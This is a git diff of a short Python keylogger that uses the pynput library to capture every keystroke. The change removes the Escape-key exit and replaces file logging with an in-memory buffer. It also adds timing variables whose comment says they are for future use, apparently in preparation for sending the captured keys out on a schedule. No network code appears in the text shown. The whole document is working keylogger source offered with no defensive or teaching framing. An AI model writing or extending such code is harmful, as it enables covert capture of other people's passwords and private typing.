@@ -1,20 +1,23 @@
 from pynput import keyboard
-import datetime
+import time
+
+# buffer to store key logs to increase performance
+log_buffer = []
+
+# time variables for future use.... (delay)
+SEND_INTERVAL = 0
+last_sent_time = time.time()
 
 def key_pressed(key):
     try:
         char = key.char
-        if char is not None: 
-            print(char, end='', flush=True)  
-            with open("keyfile.txt", 'a') as log_key:
-                log_key.write(char)
+        print(char)
+        if char:
+            log_buffer.append(char)
     except AttributeError:
-        print(f"[{key}]", end='', flush=True)  
-        with open("keyfile.txt", 'a') as log_key:
-            log_key.write(f"[{key}]")
-        if key == keyboard.Key.esc:
-            print("Escape pressed, exiting...")
-            return False
+        special_key = f"{key}"
+        print(special_key)
+        log_buffer.append(special_key)
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=key_pressed)
